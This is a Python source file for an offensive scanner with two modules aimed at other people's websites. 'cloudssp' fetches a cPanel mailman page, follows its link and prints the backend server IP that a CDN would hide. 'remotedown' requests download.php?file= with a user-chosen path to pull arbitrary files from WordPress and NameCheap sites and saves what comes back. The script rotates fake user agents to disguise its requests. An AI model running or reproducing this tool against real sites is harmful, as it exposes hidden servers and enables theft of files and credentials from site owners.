import requests, random
from colorama import Fore
from bs4 import BeautifulSoup

def print_error(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTRED_EX}ERRO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def print_sucess(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTGREEN_EX}INFO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def print_info(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTYELLOW_EX}INFO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def print_warning(a):
    print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTYELLOW_EX}WARN {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')

def helper():
    print(f'''{Fore.LIGHTBLACK_EX}
Modules : 
    {Fore.LIGHTGREEN_EX}cloudssp    {Fore.MAGENTA}-   {Fore.WHITE}CPanel vulnerability to get the host backend
    {Fore.LIGHTGREEN_EX}remotedown  {Fore.MAGENTA}-   {Fore.WHITE}Remote download vulnerability in Wordpress and NameCheap websites  
''')

def useragent():
    arr = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3","Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16","Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"]
    return arr[random.randint(0,len(arr)-1)]

def cloudssp(target):
    if 'http' not in target:
        print_error('Please enter a valid website ( https://test.com )')
        return
    print_info(f'Starting module CloudSSP on {target}')

    try:
        ua = useragent()
        req = requests.get(f'{target}//mailman/listinfo/mailman', headers={"user-agent": ua})
        print_info(f'Using : {ua}')
    except:
        print_warning('Target seems to be offline')
        return

    if req.status_code == 200:
        try:
            soup = BeautifulSoup(req.text, 'html.parser')
            backend = soup.find_all('a')
            backend = requests.get(f'{backend[0].get("href")}', stream=True)
            backend = backend.raw._connection.sock.getpeername()[0]
            print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} vulnerable')
            print_sucess(f'Backend IP : {Fore.MAGENTA}{backend}{Fore.WHITE}')
        except:
            print_error('Target isn\'t vulnerable')

def remotedown(target):
    if 'http' not in target:
        print_error('Please enter a valid website ( https://test.com )')
        return
    print_info(f'Starting module RemoteDown on {target}')
    print_info('Input file to download default to test is download.php')
    downfile = input(f'{Fore.WHITE}[{Fore.MAGENTA} INPU{Fore.WHITE} ] {Fore.GREEN}~>{Fore.WHITE} ')
    try:
        ua = useragent()
        req = requests.get(f'{target}/download.php?file={downfile}', headers={"user-agent": ua})
    except:
        print_warning('Target seems to be offline')
        return

    if req.status_code == 200:
        f = open('output.txt', 'w').write(req.text)
        print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} vulnerable')
        print_sucess('Output saved to output.txt')

    else:    
        print_error('Target isn\'t vulnerable')